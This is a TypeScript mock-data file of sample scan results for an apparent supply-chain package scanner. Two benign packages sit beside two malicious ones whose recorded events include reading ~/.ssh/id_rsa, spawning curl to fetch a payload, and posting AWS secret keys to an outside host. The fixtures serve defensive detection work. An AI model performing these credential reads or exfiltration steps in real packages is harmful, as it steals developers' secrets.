import type { Scan } from "../types/scan";

const now = Date.now();

export const mockScans: Scan[] = [
  {
    id: "clean-left-pad",
    package_name: "left-pad",
    status: "done",
    claims: {
      summary: "string padding utility",
      allowed_capabilities: [],
    },
    events: [],
    verdict: {
      risk: "low",
      score: 0,
      flags: [],
    },
    updated_at: new Date(now).toISOString(),
  },
  {
    id: "http-fetcher",
    package_name: "http-fetcher",
    status: "done",
    claims: {
      summary: "HTTP client library",
      allowed_capabilities: ["network"],
    },
    events: [
      {
        phase: "import",
        type: "network",
        detail: "GET https://api.example.com/v1/status",
        severity: "normal",
        timestamp: new Date(now - 8_000).toISOString(),
      },
    ],
    verdict: {
      risk: "low",
      score: 5,
      flags: [],
    },
    updated_at: new Date(now).toISOString(),
  },
  {
    id: "evil-left-pad",
    package_name: "left-pad",
    status: "done",
    claims: {
      summary: "string utility",
      allowed_capabilities: [],
    },
    events: [
      {
        phase: "install",
        type: "file_read",
        detail: "Read ~/.ssh/id_rsa",
        severity: "anomalous",
        timestamp: new Date(now - 12_000).toISOString(),
      },
      {
        phase: "install",
        type: "subprocess",
        detail: "Spawned process: curl https://packages.example.net/payload",
        severity: "anomalous",
        timestamp: new Date(now - 10_000).toISOString(),
      },
    ],
    verdict: {
      risk: "high",
      score: 98,
      flags: [
        "Read sensitive SSH private key outside declared capabilities",
        "Spawned curl subprocess outside declared capabilities",
      ],
    },
    updated_at: new Date(now).toISOString(),
  },
  {
    id: "color-logger-pro",
    package_name: "color-logger-pro",
    status: "done",
    claims: {
      summary: "terminal colorizer",
      allowed_capabilities: [],
    },
    events: [
      {
        phase: "import",
        type: "env_read",
        detail: "Read environment variable AWS_SECRET_ACCESS_KEY",
        severity: "anomalous",
        timestamp: new Date(now - 4_000).toISOString(),
      },
      {
        phase: "import",
        type: "network",
        detail: "POST https://telemetry.example.org/collect with environment data",
        severity: "anomalous",
        timestamp: new Date(now - 3_900).toISOString(),
      },
    ],
    verdict: {
      risk: "high",
      score: 95,
      flags: [
        "Read AWS_SECRET_ACCESS_KEY outside declared capabilities",
        "Made an undeclared network request immediately after reading a secret",
      ],
    },
    updated_at: new Date(now).toISOString(),
  },
];
